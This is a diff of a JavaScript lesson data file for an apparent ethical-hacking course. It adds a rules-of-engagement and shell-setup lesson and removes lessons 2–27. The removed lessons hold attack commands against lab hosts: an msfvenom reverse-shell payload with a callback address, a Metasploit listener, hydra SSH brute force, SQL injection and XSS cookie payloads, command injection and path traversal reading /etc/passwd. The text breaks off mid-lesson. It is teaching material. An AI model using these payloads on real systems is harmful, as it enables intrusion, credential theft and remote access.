@@ -1,441 +1,551 @@
 /* ================================================================
-   NIGHTERS CYBER ACADEMY — lessons-data.js (Complete 30 Levels Matrix)
+   NIGHTERS CYBER ACADEMY — Professional Foundations Roadmap (1-10)
    ================================================================ */
 
 const LESSONS = [
-  // ── PHASE 1: FOUNDATION (MONTH 1) ───────────────────────────────
+  // ── PHASE 1: COMPUTER & LINUX FOUNDATIONS (LEVELS 1–5) ───────
   {
-    id: 1, title: "Setting Up Your Arsenal", emoji: "📱", subtitle: "Install Termux and Debian. Get ready for everything.", type: "system", phase: 1, month: 1, points: 50, duration_mins: 60,
-    intro: "Before launching attacks, your local environment must be locked down and loaded. This tier configures your command layer using an isolated Unix terminal wrapper.",
+    id: 1,
+    title: "Introduction to Ethical Hacking",
+    emoji: "📱",
+    subtitle: "Rules of Engagement, Mindsets & Workstation Setup",
+    type: "system",
+    phase: 1,
+    month: 1,
+    points: 50,
+    duration_mins: 60,
+    intro: "Welcome to the operational gateway. Legitimate security engineering depends entirely on legal authorization, strict scope limits, and meticulous documentation habits.",
+    objectives: [
+      "Explain the fundamental difference between ethical hacking and unauthorized intrusion.",
+      "Describe the core operational structures of Red, Blue, and Purple Teams.",
+      "Understand why explicit written authorization and scope boundaries are essential.",
+      "Initialize an isolated local workstation terminal layer via Termux and Debian."
+    ],
+    theory: "Ethical hacking is the practice of evaluating system security architecture with the explicit, written permission of the owner. Legitimate professionals follow the Rules of Engagement (RoE) to discover gaps before malicious actors exploit them. Red Teams simulate adversarial attacks; Blue Teams defend and monitor infrastructure; Purple Teams coordinate both sides to maximize security improvements. Testing an asset without a written contract can violate global computer misuse laws.",
     sections: [
       {
-        title: "Install Termux Ecosystem",
-        steps: ["Download and compile the F-Droid app application layer.", "Search for the standalone Termux application frame.", "Initialize environment and query filesystem permissions parameters."],
-        cmd: [{ t: "c", v: "Update primary package indices" }, { t: "cmd", v: "pkg update && pkg upgrade -y" }, { t: "ok", v: "Packages successfully upgraded." }]
+        title: "Workstation Initialization and Navigation",
+        steps: [
+          "Launch your Termux ecosystem wrapper on your Android device.",
+          "Log into the local Debian proot simulation system layer.",
+          "Create a dedicated, organized parent directory structure for all future labs."
+        ],
+        cmd: [
+          { t: "c", v: "Verify your current workspace location" },
+          { t: "cmd", v: "pwd" },
+          { t: "out", v: "/home/malik" },
+          { t: "c", v: "Build the primary academy testing workspace paths" },
+          { t: "cmd", v: "mkdir -p labs/notes && cd labs && ls -la" },
+          { t: "out", v: "total 12\ndrwxr-xr-x 3 malik root 4096 Jun 26 07:00 .\ndrwxr-xr-x 4 malik root 4096 Jun 26 07:00 ..\ndrwxr-xr-x 2 malik root 4096 Jun 26 07:00 notes" },
+          { t: "ok", v: "Workstation profile environment configured successfully under malik@root." }
+        ]
       }
     ],
-    hints: ["Avoid downloading components via the standard Google Play Store to maintain proper path dependencies."],
-    quiz: [{ q: "Which engine source package stream is supported for architecture provisioning?", opts: ["Play Store Core", "F-Droid Mirror Hub", "Direct ZIP extraction", "Cloud Emulation API"], a: 1 }],
-    assignment: { title: "Environment Verification", tasks: ["Provision shell pipeline terminal instance.", "Verify execution loops inside sandbox."], submit: "Provide screenshot confirmation of clean core upgrade execution output logs." }
-  },
-  {
-    id: 2, title: "Linux Shell Navigation Basics", emoji: "📁", subtitle: "Mastering standard pipeline directory commands.", type: "system", phase: 1, month: 1, points: 50, duration_mins: 45,
-    intro: "Operating inside target architectures requires fluid familiarity with non-GUI environments.",
-    sections: [
-      {
-        title: "Traversal Commands Matrix",
-        steps: ["Print active workspace path parameters.", "List directory descriptors and systemic file masks."],
-        cmd: [{ t: "cmd", v: "pwd && ls -la" }, { t: "out", v: "drwxr-xr-x  2 operative root 4096" }]
-      }
+    challenge: "Independent Challenge: Create a new directory named 'scope_verification' inside your notes folder. Inside it, use terminal shortcuts to generate a new text file named 'rules.txt'.",
+    hints: [
+      "Paths in Linux are strict; verify lowercase versus uppercase spelling across directory strings.",
+      "Use 'mkdir -p' if you want to generate nested subfolders automatically in a single command line pass."
     ],
-    hints: ["Use explicit file access attribute flags to locate structural dotfiles."],
-    quiz: [{ q: "Which operator outputs the active operational absolute path?", opts: ["dir", "path -show", "pwd", "whereami"], a: 2 }],
-    assignment: { title: "Filesystem Exploration", tasks: ["Map target user path strings.", "Locate configuration artifacts."], submit: "Submit absolute string paths matching localized system variables." }
-  },
-  {
-    id: 3, title: "File Operations & Data Streams", emoji: "📝", subtitle: "Creating, copying, moving, and viewing raw buffers.", type: "system", phase: 1, month: 1, points: 50, duration_mins: 40,
-    intro: "Interrogating parameters and building attack modules requires file stream modification pipelines.",
-    sections: [
-      {
-        title: "Stream Editors & Buffers",
-        steps: ["Initialize text vector via command line standard input.", "Concatenate file configurations to standard console outputs."],
-        cmd: [{ t: "cmd", v: "echo 'TARGET_ACTIVE' > scope.txt && cat scope.txt" }, { t: "out", v: "TARGET_ACTIVE" }]
-      }
+    quiz: [
+      { q: "What is the primary document defining what a security professional can and cannot test?", opts: ["Software License", "Rules of Engagement / Scope of Work", "Privacy Policy", "Source Code Documentation"], a: 1 },
+      { q: "Which Linux terminal instruction outputs the absolute path string of your active workspace?", opts: ["ls", "cd", "pwd", "cat"], a: 2 }
     ],
-    hints: ["Double bracket operators append payloads; single brackets overwrite existing file boundaries."],
-    quiz: [{ q: "Which string operator handles non-destructive array logging append operations?", opts: [">", ">>", "<|", "&="], a: 1 }],
-    assignment: { title: "Payload Assembly Lab", tasks: ["Generate payload manifests.", "Merge independent code assets into unified scripts."], submit: "Provide structural logs mapping content array streams." }
-  },
-  {
-    id: 4, title: "Permissions & Ownership Layers", emoji: "🔑", subtitle: "Breaking boundaries with chmod and chown structures.", type: "system", phase: 1, month: 1, points: 60, duration_mins: 50,
-    intro: "Understanding file system privileges allows attackers to find logic flaws and modify scripts safely.",
-    sections: [
-      {
-        title: "Privilege Attribute Modification",
-        steps: ["Grant full read, write, and execute permissions to a custom utility.", "Inspect updated system permission bitmasks."],
-        cmd: [{ t: "cmd", v: "chmod +x exploit.sh && ls -l exploit.sh" }, { t: "out", v: "-rwxr-xr-x 1 operative" }]
-      }
-    ],
-    hints: ["Hex/Octal notation maps bits explicitly (755 corresponds to standard owner execution parameters)."],
-    quiz: [{ q: "What string state does the octal value '777' describe?", opts: ["Root execution exception filter", "Global read-only restriction", "Full universal read, write, and execute permissions", "Encrypted structural boundary block"], a: 2 }],
-    assignment: { title: "Access Elevation Matrix", tasks: ["Configure non-executable target scripts.", "Verify functional binary execution loops."], submit: "Upload logs showing binary files safely running in the terminal workspace." }
-  },
-  {
-    id: 5, title: "Process Execution Control", emoji: "⚙️", subtitle: "Managing background payloads and worker processes.", type: "system", phase: 1, month: 1, points: 60, duration_mins: 45,
-    intro: "Long-running collection loops and reverse access shells must be pushed into background operational processes.",
-    sections: [
-      {
-        title: "Background Process Orchestration",
-        steps: ["Launch listener jobs using background operators.", "List operational thread indicators currently running in the active workspace."],
-        cmd: [{ t: "cmd", v: "sleep 100 & jobs" }, { t: "out", v: "[1]+ Running sleep 100 &" }]
-      }
-    ],
-    hints: ["Appending an ampersand tells the interface to fork process execution immediately into a background worker thread."],
-    quiz: [{ q: "Which utility sends system termination flags directly to active process identifiers?", opts: ["stop", "kill", "halt", "drop"], a: 1 }],
-    assignment: { title: "Process Lifecycle Lab", tasks: ["Launch multiple mock monitor services.", "Locate and isolate thread process IDs to terminate them."], submit: "Log process ID tables matching targeted script filters." }
-  },
-  {
-    id: 6, title: "Advanced Package Management", emoji: "📦", subtitle: "Compiling attack components from software repositories.", type: "system", phase: 1, month: 1, points: 70, duration_mins: 55,
-    intro: "Custom utilities require accurate source installation channels and dependencies across system profiles.",
-    sections: [
-      {
-        title: "Repository Source Validation",
-        steps: ["Synchronize remote asset endpoints.", "Install compilation helper tool sets directly via terminal layers."],
-        cmd: [{ t: "cmd", v: "apt update && apt install git make -y" }, { t: "ok", v: "Build essentials initialized." }]
-      }
-    ],
-    hints: ["Missing build parameters often prevent framework binaries from compiling successfully on custom devices."],
-    quiz: [{ q: "Which toolkit interface serves as the standard package manager for Debian systems?", opts: ["rpm", "pacman", "apt", "yum"], a: 2 }],
-    assignment: { title: "Tooling Deployment Validation", tasks: ["Source core build dependencies from public code repositories.", "Verify tool syntax structures."], submit: "Verify successful installations by querying your version parameters via the terminal." }
-  },
-  {
-    id: 7, title: "Text Extraction & Stream Filters", emoji: "🔍", subtitle: "Parsing access logs using grep and regular expressions.", type: "system", phase: 1, month: 1, points: 70, duration_mins: 60,
-    intro: "Isolating database tables, administrative paths, or leak tokens requires deep data log parsing pipelines.",
-    sections: [
-      {
-        title: "Regular Expression Identification",
-        steps: ["Isolate target communication events from plain text strings.", "Count occurrences matching structural profile anomalies."],
-        cmd: [{ t: "cmd", v: "grep -i 'password' auth.log" }, { t: "out", v: "Jan 26 12:00:01 admin accepted password" }]
-      }
-    ],
-    hints: ["Combine regular pipes with filtration modules to build automated threat alerts."],
-    quiz: [{ q: "Which core utility extracts explicit structural search profiles using pattern matching?", opts: ["find", "grep", "locate", "cat"], a: 1 }],
-    assignment: { title: "Log Analysis Drill", tasks: ["Parse a simulated server logs dataset.", "Isolate user access exceptions and token anomalies."], submit: "Provide string counts matching compromised user identity parameters." }
-  },
-  {
-    id: 8, title: "Network State Enumeration", emoji: "🌐", subtitle: "Inspecting open sockets, device connections, and routing paths.", type: "system", phase: 1, month: 1, points: 80, duration_mins: 60,
-    intro: "Identifying local listening vectors helps confirm where databases and open ports are waiting for connections.",
-    sections: [
-      {
-        title: "Active Port Mapping",
-        steps: ["Examine operational TCP routing interfaces.", "Isolate service configurations bind values."],
-        cmd: [{ t: "cmd", v: "ss -tulpn" }, { t: "out", v: "Netid State Recv-Q Send-Q Local Address:Port" }]
-      }
-    ],
-    hints: ["Privileged port fields below index 1024 require administrative security permissions to establish loops."],
-    quiz: [{ q: "Which utility maps network routing states, active interface bindings, and connection sockets?", opts: ["ping", "ss", "ifconfig", "traceroute"], a: 1 }],
-    assignment: { title: "Interface Architecture Scan", tasks: ["Map open service configurations on your local device.", "Identify local web server listening vectors."], submit: "Submit the loopback port values discovered during your local network state scan." }
-  },
-  {
-    id: 9, title: "OSINT Target Profiling Tools", emoji: "📡", subtitle: "Scouting targets using automated data collection scripts.", type: "system", phase: 1, month: 1, points: 80, duration_mins: 90,
-    intro: "Open Source Intelligence helps you map asset surfaces, email schemas, and server setups before launching direct scans.",
-    sections: [
-      {
-        title: "Asset Harvesting Pipelines",
-        steps: ["Deploy reconnaissance tools against authorized playground assets.", "Export profile maps to log files."],
-        cmd: [{ t: "cmd", v: "theHarvester -d sandbox.nighters.lan -l 500 -b baidu" }, { t: "out", v: "[*] Targets discovered: 3 subdomains" }]
-      }
-    ],
-    hints: ["Passive reconnaissance loops do not interact directly with target hosting firewalls."],
-    quiz: [{ q: "What defines an informative 'Passive Reconnaissance' footprint loop?", opts: ["Direct fuzzing of endpoint nodes", "Extracting publicly indexed records without hitting host servers", "Launching buffer exploits", "Modifying user passwords"], a: 1 }],
-    assignment: { title: "Passive Exposure Report", tasks: ["Gather exposed identity logs for simulated testing domains.", "Map public subdomain profiles."], submit: "Document discovered external domain maps and structural endpoints safely." }
-  },
-  {
-    id: 10, title: "Bash Automation Frameworks", emoji: "🤖", subtitle: "Writing automated server checking scripts.", type: "system", phase: 1, month: 1, points: 100, duration_mins: 120,
-    intro: "Automated scripting handles the boring stuff, letting you chain complex terminal commands into rapid, single-click attack tools.",
-    sections: [
-      {
-        title: "Automation Shell Scripts",
-        steps: ["Write conditional check loops to test target state changes.", "Make the tool executable and test its logic loops."],
-        cmd: [{ t: "cmd", v: "echo -e '#!/bin/bash\nif [ 1 -eq 1 ]; then echo \"ONLINE\"; fi' > ping.sh && bash ping.sh" }, { t: "out", v: "ONLINE" }]
-      }
-    ],
-    hints: ["Always include a proper hashbang expression on line one to tell the terminal which shell interpreter to load."],
-    quiz: [{ q: "What is the standard bash path instruction used inside standard automation hashbangs?", opts: ["#!/bin/bash", "#/run/bash", "//@use-bash", "import bash"], a: 0 }],
-    assignment: { title: "Recon Automation Lab", tasks: ["Write an automated port tester script.", "Build log file exports directly into your tool logic."], submit: "Submit the complete automation code block for administrative review." }
-  },
-
-  // ── PHASE 2: RECON & EXPLOIT MATRIX (MONTH 2) ──────────────────
-  {
-    id: 11, title: "Active Target Scanning (Nmap)", emoji: "🎯", subtitle: "Discovering service names and versions behind open ports.", type: "web", phase: 2, month: 2, points: 100, duration_mins: 60,
-    intro: "Active scanning maps structural system profiles, telling you exactly which service versions are running behind open network ports.",
-    sections: [
-      {
-        title: "Service Signature Scans",
-        steps: ["Run a comprehensive version scan against an authorized playground machine.", "Analyze open port configurations and OS signatures."],
-        cmd: [{ t: "cmd", v: "nmap -sV -Pn 10.10.12.45" }, { t: "out", v: "PORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.41" }]
-      }
-    ],
-    hints: ["Using the `-Pn` switch bypasses host discovery filters by treating the target as permanently active."],
-    quiz: [{ q: "Which Nmap parameter flag requests explicit service version configuration profiling?", opts: ["-sS", "-O", "-sV", "-A"], a: 2 }],
-    assignment: { title: "Network Architecture Discovery", tasks: ["Scan target IP nodes to map active network ports.", "Document any discovered server application engines."], submit: "Submit the exact service configuration versions found on the target host." }
-  },
-  {
-    id: 12, title: "Web Architecture Inspection", emoji: "🌐", subtitle: "Analyzing response frames and security cookies.", type: "web", phase: 2, month: 2, points: 100, duration_mins: 60,
-    intro: "Checking application tech stacks gives you a blueprint of the framework versions, headers, and load structures in play.",
-    sections: [
-      {
-        title: "Header Parameter Inspections",
-        steps: ["Query target response logs using raw endpoint tests.", "Check cookie security attributes like HttpOnly and Secure flags."],
-        cmd: [{ t: "cmd", v: "curl -I https://sandbox.nighters.lan" }, { t: "out", v: "HTTP/1.1 200 OK\nX-Powered-By: PHP/7.4.3" }]
-      }
-    ],
-    hints: ["Exposed server headers can reveal exact patch version numbers, giving attackers a hint on what exploits might work."],
-    quiz: [{ q: "Which flag forces curl to pull down header responses instead of body content arrays?", opts: ["-X POST", "-I", "-d", "--raw"], a: 1 }],
-    assignment: { title: "Header Exposure Analysis", tasks: ["Extract header payloads from mock laboratory web views.", "Check for missing platform defense configuration rules."], submit: "List all custom or unhardened platform version strings found in the response." }
-  },
-  {
-    id: 13, title: "Directory Invalidation (Fuzzing)", emoji: "📂", subtitle: "Brute-forcing hidden routes and backup directories.", type: "web", phase: 2, month: 2, points: 120, duration_mins: 75,
-    intro: "Directory busting hammers web endpoints with wordlists to uncover forgotten folders, source files, and setup backups.",
-    sections: [
-      {
-        title: "Endpoint Path Discovery",
-        steps: ["Run a directory path scan using dedicated discovery wordlists.", "Filter out noisy server response messages like 404 pages."],
-        cmd: [{ t: "cmd", v: "gobuster dir -u http://10.10.12.45 -w /usr/share/wordlists/dirb/common.txt" }, { t: "out", v: "Found: /backup.zip (Status: 200)" }]
-      }
-    ],
-    hints: ["Pay close attention to size status returns; a sudden size shift can mean you found an access bypass rule."],
-    quiz: [{ q: "What web response status code shows that an endpoint route requires authentication?", opts: ["200 OK", "301 Redirect", "401 Unauthorized", "404 Not Found"], a: 2 }],
-    assignment: { title: "Hidden Path Lab", tasks: ["Fuzz the challenge web machine routes.", "Locate hidden administration assets or code backups."], submit: "Provide the secret URL string path discovered via your brute-force scan." }
-  },
-  {
-    id: 14, title: "Subdomain Enumeration Systems", emoji: "🔀", subtitle: "Discovering development portals and staging sites.", type: "web", phase: 2, month: 2, points: 120, duration_mins: 80,
-    intro: "Companies often leave staging platforms and internal testing domains exposed right alongside their main web pages.",
-    sections: [
-      {
-        title: "Virtual Host Discoveries",
-        steps: ["Scan root domains using virtual host brute-forcing setups.", "Track unexpected server redirection responses."],
-        cmd: [{ t: "cmd", v: "wfuzz -c -w subdomains.txt -u http://nighters.lan -H 'Host: FUZZ.nighters.lan'" }, { t: "out", v: "000023:  C=200      32 L      148 W       1205 Ch        'dev'" }]
-      }
-    ],
-    hints: ["Filtering out standard line numbers or word lengths helps clear away noisy false positives from wildcard domains."],
-    quiz: [{ q: "Why do red teamers explicitly target dev/staging subdomains?", opts: ["They use stronger encryption keys", "They often lack security monitoring and run unpatched testing code", "They are hosted offline", "They contain no user accounts"], a: 1 }],
-    assignment: { title: "Subdomain Exposure Mapping", tasks: ["Map out the hidden subdomain infrastructure of our lab playground.", "Isolate development servers."], submit: "Submit the valid subdomain addresses you managed to uncover during the scan." }
-  },
-  {
-    id: 15, title: "Vulnerability Database Mapping", emoji: "🗄️", subtitle: "Matching version maps against public exploits.", type: "web", phase: 2, month: 2, points: 130, duration_mins: 90,
-    intro: "Once you map service versions, cross-reference them with public databases to see if working exploits are already documented.",
-    sections: [
-      {
-        title: "Exploit Search Engines",
-        steps: ["Search local vulnerability databases for known exploit scripts.", "Check exploit code logs for patch matching accuracy."],
-        cmd: [{ t: "cmd", v: "searchsploit apache 2.4.41" }, { t: "out", v: "Apache 2.4.41 - Multiple Vulnerabilities" }]
-      }
-    ],
-    hints: ["Always carefully inspect exploit source code structures before running it to ensure it functions as intended."],
-    quiz: [{ q: "What does the industry standard term 'CVE' stand for?", opts: ["Common Vulnerabilities and Exposures", "Core Vendor Encryption", "Critical Vector Evaluation", "Central Verification Engine"], a: 0 }],
-    assignment: { title: "Vulnerability Verification", tasks: ["Identify working exploit modules for the unpatched software in our lab.", "Extract their CVE tracking reference numbers."], submit: "Submit the CVE ID matching the unpatched software layer." }
-  },
-  {
-    id: 16, title: "Exploitation Basics (Metasploit)", emoji: "💥", subtitle: "Configuring listeners and managing reverse shells.", type: "system", phase: 2, month: 2, points: 150, duration_mins: 100,
-    intro: "Learn how to weaponize known system bugs by configuring exploit payloads, setting listeners, and establishing your first remote shell access.",
-    sections: [
-      {
-        title: "Framework Console Configs",
-        steps: ["Launch the core exploitation platform module.", "Select the target exploit module and configure your callback listeners."],
-        cmd: [{ t: "cmd", v: "msfconsole -q\nuse exploit/multi/handler\nset LHOST 10.10.14.5" }, { t: "out", v: "msf exploit(multi/handler) >" }]
-      }
-    ],
-    hints: ["Double-check that your LHOST parameter is set to your actual network adapter interface address, or your payloads won't call back."],
-    quiz: [{ q: "What is the core difference between a standard bind shell and a reverse shell connection?", opts: ["Bind shells encrypt all data streams automatically", "Reverse shells force the target system to dial out to your listener platform, bypassing inbound firewall rules", "Bind shells require no network ports", "Reverse shells only run on Windows targets"], a: 1 }],
-    assignment: { title: "Callback Listener Setup", tasks: ["Configure an multi-handler listener node inside the lab setup.", "Prepare a reverse callback session profile."], submit: "Log your configured listener variables and parameters for review." }
-  },
-  {
-    id: 17, title: "Payload Generation Techniques", emoji: "💾", subtitle: "Compiling stand-alone binaries and reverse access scripts.", type: "system", phase: 2, month: 2, points: 150, duration_mins: 110,
-    intro: "Generate weaponized single-click execution files and script extensions tailored to your target machine's architecture.",
-    sections: [
-      {
-        title: "Binary Payload Generation",
-        steps: ["Generate an executable cross-platform shell connection script payload.", "Deploy listener nodes to catch the inbound terminal traffic."],
-        cmd: [{ t: "cmd", v: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf > session.elf" }, { t: "out", v: "Payload size: 249 bytes saved to session.elf" }]
-      }
-    ],
-    hints: ["Payload size properties alter how easily a piece of code slips through strict application buffer limits."],
-    quiz: [{ q: "Which tool handles automated payload building and format compilation within Metasploit environments?", opts: ["msfconsole", "msfvenom", "msfdb", "meterpreter"], a: 1 }],
-    assignment: { title: "Cross-Architecture Compiles", tasks: ["Build a working executable connection script payload for our lab machine.", "Confirm the file runs smoothly inside the sandbox."], submit: "Upload the specific parameter settings used during generation." }
-  },
-  {
-    id: 18, title: "Interactive Session Upgrades", emoji: "🐚", subtitle: "Upgrading limited reverse shells into stable system dashboards.", type: "system", phase: 2, month: 2, points: 160, duration_mins: 90,
-    intro: "Basic reverse shells are brittle and break easily. Learn how to upgrade them into full, interactive terminal environments with tab completion and proper text scaling.",
-    sections: [
-      {
-        title: "TTY Shell Provisioning",
-        steps: ["Break out of raw script setups using an inline runtime command trick.", "Background your active workspace to fix local terminal parameters."],
-        cmd: [{ t: "cmd", v: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" }, { t: "out", v: "operative@target:/$" }]
-      }
-    ],
-    hints: ["Use `stty raw -echo` on your machine to let terminal controls like Ctrl+C pass directly to the remote system without killing your session."],
-    quiz: [{ q: "Why are raw terminal connections upgraded to fully interactive TTY environments?", opts: ["To turn on full terminal path history and run programs like text editors or password prompts", "To bypass file encryption locks", "To automatically gain root access", "To run network port scans from the host"], a: 0 }],
-    assignment: { title: "Terminal Stability Matrix", tasks: ["Catch a limited connection script callback inside the sandbox.", "Upgrade it to a stable TTY environment."], submit: "Submit the series of commands used to upgrade your shell to a stable state." }
-  },
-  {
-    id: 19, title: "Target Database Extraction", emoji: "🗄️", subtitle: "Interrogating relational engines and reading database files.", type: "web", phase: 2, month: 2, points: 180, duration_mins: 120,
-    intro: "Learn how to manually query relational databases, search configuration tables, and dump stored user credentials once inside a target server.",
-    sections: [
-      {
-        title: "Relational Query Routines",
-        steps: ["Log into a localized back-end data engine using discovered access codes.", "Extract database names, column listings, and application credentials."],
-        cmd: [{ t: "cmd", v: "mysql -u operative -p'SEC_DATA_99' -e 'SHOW DATABASES;'" }, { t: "out", v: "Database: core_app_users" }]
-      }
-    ],
-    hints: ["Look for configuration files like `config.php` or `.env` inside web roots; they are goldmines for database passwords."],
-    quiz: [{ q: "Which file format is commonly used to cache application database connection secrets?", opts: ["index.html", ".env", "style.css", "robots.txt"], a: 1 }],
-    assignment: { title: "Internal Credential Audit", tasks: ["Navigate to the storage paths on the lab target.", "Extract credential records from the operational database tables."], submit: "Submit the administrative login credentials found hidden inside the table files." }
-  },
-  {
-    id: 20, title: "Network Lateral Pivoting", emoji: "⛓️", subtitle: "Routing attack tools through compromised systems into internal networks.", type: "system", phase: 2, month: 2, points: 200, duration_mins: 150,
-    intro: "Systems deep within an internal network are often blocked from direct internet access. Learn how to turn a compromised machine into a secure traffic proxy to reach deeper network zones.",
-    sections: [
-      {
-        title: "Proxy Tunneling Setup",
-        steps: ["Configure a secure local routing proxy path from your active terminal session.", "Update your system proxy tool maps to route external scanning traffic through that tunnel."],
-        cmd: [{ t: "cmd", v: "route add 192.168.5.0/24 1" }, { t: "ok", v: "Routing table adjusted safely." }]
-      }
-    ],
-    hints: ["Using dynamic forwarding options lets you pass all your scanning tools through a single proxy port smoothly."],
-    quiz: [{ q: "What is the main goal of setting up a 'Pivoting' route?", opts: ["To crack local user hashes faster", "To use a compromised machine as a proxy jump point to attack hidden internal networks", "To wipe system log trails", "To run website performance tests"], a: 1 }],
-    assignment: { title: "Deep Network Tunneling", tasks: ["Establish a secure tunnel through the boundary node in our lab setup.", "Scan and map out the hidden internal network range behind it."], submit: "List the active internal IP nodes uncovered through your pivoting tunnel." }
-  },
-
-  // ── PHASE 3: RED TEAM ADVANCED ENCOUNTERS (MONTH 3) ──────────────
-  {
-    id: 21, title: "SQL Injection Vectors (SQLi)", emoji: "💉", subtitle: "Bypassing login pages and dumping backend databases.", type: "web", phase: 3, month: 3, points: 200, duration_mins: 90,
-    intro: "Learn how unescaped user inputs allow attackers to inject raw database queries, bypass login logic, and extract backend information.",
-    sections: [
-      {
-        title: "Input Validation Invalidation",
-        steps: ["Inject query breakout codes into unprotected form fields.", "Force database query returns to dump authentication records."],
-        cmd: [{ t: "cmd", v: "admin' OR '1'='1" }, { t: "out", v: "Login Successful. Welcome Administrator." }]
-      }
-    ],
-    hints: ["Single quote characters break raw string inputs, forcing the database parser to read your injected logic directly."],
-    quiz: [{ q: "What is the root cause of SQL Injection vulnerabilities?", opts: ["Using weak login passwords", "Directly running untrusted user inputs as raw database queries without sanitation", "Leaving network port 80 open", "Misconfigured web design rules"], a: 1 }],
-    assignment: { title: "Authentication Bypass Lab", tasks: ["Bypass the input gate on the challenge machine.", "Extract structural profile tables from the target backend."], submit: "Provide the secret flag token exposed by the vulnerable query loop." }
-  },
-  {
-    id: 22, title: "Cross-Site Scripting (XSS)", emoji: "🔮", subtitle: "Injecting malicious scripts into user sessions.", type: "web", phase: 3, month: 3, points: 200, duration_mins: 100,
-    intro: "See how failing to sanitize website inputs lets attackers inject malicious JavaScript that executes right inside the browsers of other users.",
-    sections: [
-      {
-        title: "Script Payload Injections",
-        steps: ["Inject a script test payload into a vulnerable application comment field.", "Verify execution behavior when the target page loads."],
-        cmd: [{ t: "cmd", v: "<script>alert(document.cookie)</script>" }, { t: "out", v: "Pop-up execution box context rendered successfully." }]
-      }
-    ],
-    hints: ["Stored XSS is highly critical because the exploit payload gets saved to the server, hitting every user who visits that page."],
-    quiz: [{ q: "Which XSS type saves your malicious payload right onto the database server?", opts: ["Reflected XSS", "Stored XSS", "DOM-Based XSS", "Blind Relay XSS"], a: 1 }],
-    assignment: { title: "Session Hijack Simulation", tasks: ["Inject a tracking script into our lab environment's message boards.", "Capture mock user cookie strings dynamically."], submit: "Submit the captured user cookie variables for administrative validation." }
-  },
-  {
-    id: 23, title: "Brute-Force Attack Engine (Hydra)", emoji: "🔨", subtitle: "Automating password attacks against login endpoints.", type: "system", phase: 3, month: 3, points: 220, duration_mins: 90,
-    intro: "Learn how to use automated dictionary attacks to test password lists against network protocol services like SSH or FTP.",
-    sections: [
-      {
-        title: "Automated Dictionary Spraying",
-        steps: ["Configure a brute-force tool targeting our lab machine's network login protocol.", "Load target username arrays and custom wordlists into the attack engine."],
-        cmd: [{ t: "cmd", v: "hydra -l admin -P passwords.txt 10.10.12.45 ssh" }, { t: "out", v: "[22][ssh] host: 10.10.12.45 login: admin password: superoperator" }]
-      }
-    ],
-    hints: ["Running password attacks too fast can lock target accounts or sound alarms on network firewalls."],
-    quiz: [{ q: "What type of attack tests long lists of pre-written passwords against a target login page?", opts: ["Phishing Attack", "Dictionary/Brute-Force Attack", "SQL Injection", "Man-in-the-Middle Attack"], a: 1 }],
-    assignment: { title: "Network Access Recovery", tasks: ["Run an online brute-force test against the lab target's authentication gate.", "Recover working system access combinations."], submit: "Submit the working login credentials discovered via your attack engine." }
-  },
-  {
-    id: 24, title: "Command Injection Vulnerabilities", emoji: "💻", subtitle: "Forcing target web servers to execute raw operating system commands.", type: "web", phase: 3, month: 3, points: 250, duration_mins: 120,
-    intro: "See how poorly designed web scripts that make system calls can be broken into, allowing you to run raw OS terminal commands right through the web browser.",
-    sections: [
-      {
-        title: "OS Command Injection",
-        steps: ["Locate a web page that makes internal server-side system engine calls.", "Append chain operators like semicolons or pipes to inject your own OS commands."],
-        cmd: [{ t: "cmd", v: "127.0.0.1; cat /etc/passwd" }, { t: "out", v: "root:x:0:0:root:/root:/bin/bash" }]
-      }
-    ],
-    hints: ["Semicolons tell Unix systems to start executing a brand new command string immediately, ignoring whatever came before it."],
-    quiz: [{ q: "Which character operates as a standard shell separator to chain multiple commands together?", opts: ["@", "#", ";", "\\"], a: 2 }],
-    assignment: { title: "Web Shell Deployment", tasks: ["Exploit a vulnerable inputs element on our laboratory machine.", "Force the host server to reveal its internal environment files."], submit: "Provide the unique user flags hidden within the system files." }
-  },
-  {
-    id: 25, title: "File Inclusion Flaws (LFI/RFI)", emoji: "📂", subtitle: "Reading local configuration logs or running remote payloads.", type: "web", phase: 3, month: 3, points: 250, duration_mins: 110,
-    intro: "Learn how weak directory checking lets attackers use directory traversal tricks to read a server's internal files or load remote code.",
-    sections: [
-      {
-        title: "Directory Path Traversal",
-        steps: ["Modify URL file path parameters to point directly to deep system configuration maps.", "Use directory escape sequences to jump out of protected folder restrictions."],
-        cmd: [{ t: "cmd", v: "curl http://target.lan/page.php?file=../../../../etc/passwd" }, { t: "out", v: "root:x:0:0:root:/root" }]
-      }
-    ],
-    hints: ["Using trailing null bytes or encoding your path characters can sometimes trick old code validation rules into letting your request slip through."],
-    quiz: [{ q: "What does the abbreviation 'LFI' explicitly mean in web security testing?", opts: ["Local File Inclusion", "Linear Fault Isolation", "Log File Inspection", "Layered Framework Interface"], a: 0 }],
-    assignment: { title: "Traversal Escape Lab", tasks: ["Break out of the standard web root folder limits on the challenge host.", "Extract the sensitive system configuration files."], submit: "Submit the specific string parameters used to pull down the configuration assets." }
-  },
-  {
-    id: 26, title: "Password Hash Cracking Offline", emoji: "🎛️", subtitle: "Using dictionary arrays and rule sets to break stolen hashes offline.", type: "system", phase: 3, month: 3, points: 260, duration_mins: 120,
-    intro: "When you dump database records, passwords are usually scrambled as cryptographic hashes. Learn how to crack them offline using smart wordlists and extraction rules.",
-    sections: [
-      {
-        title: "Cryptographic Hash Cracking",
-        steps: ["Save target hash values to a local text file.", "Run an offline cracker against the file, mapping the exact encryption type used."],
-        cmd: [{ t: "cmd", v: "john --format=raw-md5 hashes.txt" }, { t: "out", v: "Loaded 1 password hash... cracked: operative1" }]
-      }
-    ],
-    hints: ["Adding 'rules' to your password cracking tools automatically modifies wordlist lines with numbers and special symbols, making your attacks much more effective."],
-    quiz: [{ q: "Why do security professionals crack password hashes completely offline?", opts: ["It stops the target server from logging login attempts or locking accounts, allowing thousands of speed tests per second", "It needs no processing power", "It cleans up log trails automatically", "It guarantees instant results"], a: 0 }],
-    assignment: { title: "Hash Resolution Drill", tasks: ["Identify the encryption scheme on a set of recovered sample hashes.", "Crack the values using your local wordlists."], submit: "Submit the plaintext passwords hidden behind the cryptographic hashes." }
-  },
-  {
-    id: 27, title: "Steganography & Data Forensics", emoji: "🖼️", subtitle: "Extracting hidden operational assets from media attachments.", type: "system", phase: 3, month: 3, points: 280, duration_mins: 130,
-    intro: "Red teams use steganography to hide tools inside innocent-looking images or media files, bypassing network file inspections completely.",
-    sections: [
-      {
-        title: "Hidden Asset Extractions",
